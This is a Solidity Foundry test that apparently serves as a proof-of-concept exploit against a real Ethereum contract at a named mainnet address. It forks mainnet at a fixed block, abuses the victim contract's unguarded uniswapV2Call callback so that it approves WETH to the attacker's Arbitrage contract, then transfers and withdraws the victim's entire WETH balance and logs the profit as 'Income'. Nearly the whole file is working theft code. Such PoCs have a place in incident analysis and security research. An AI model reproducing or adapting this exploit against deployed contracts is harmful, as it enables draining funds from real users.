// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "contract/Arbitrage.sol";

contract LoanPocTest is Test {
    Arbitrage public arbitrage;
    address public exploit;
    address public weth;

    function setUp() public {
        // 0xebd365fa18a866508624b2eba9e90725d1e73490f080c5406a344cd0db14f62a
        vm.createSelectFork("https://rpc.ankr.com/eth", 16298448);
        arbitrage = new Arbitrage();
        exploit = 0x15D9Cddacc976FcE114A6fc824a155C163c782D9;
        weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    }

    function testPocLoan() public {
        uint256 balance_before = address(this).balance;
        uint256 exploit_amount = IERC20(weth).balanceOf(exploit);

        // exploitData
        address[] memory exploitData0 = new address[](1);
        bytes[] memory exploitData1 = new bytes[](1);
        exploitData0[0] = weth;
        exploitData1[0] = abi.encodeWithSignature("approve(address,uint256)", address(arbitrage), -1);

        // approve weth
        bytes[] memory payloads = new bytes[](3);
        payloads[0] = abi.encode(
            exploit,
            0,
            abi.encodeWithSignature(
                "uniswapV2Call(address,uint256,uint256,bytes)",
                address(this),
                0,
                0,
                abi.encode(exploitData0, exploitData1)
            )
        );
        // transfer weth
        payloads[1] = abi.encode(
            weth,
            0,
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)", exploit, address(arbitrage), exploit_amount
            )
        );
        // withdraw weth
        payloads[2] = abi.encode(weth, 0, abi.encodeWithSignature("withdraw(uint256)", exploit_amount));

        // exploit
        arbitrage.run(abi.encode(blockhash(block.number - 1), 0, payloads));
        arbitrage.withdraw();
        console.log("Income:", address(this).balance - balance_before);
    }

    receive() external payable {}
}
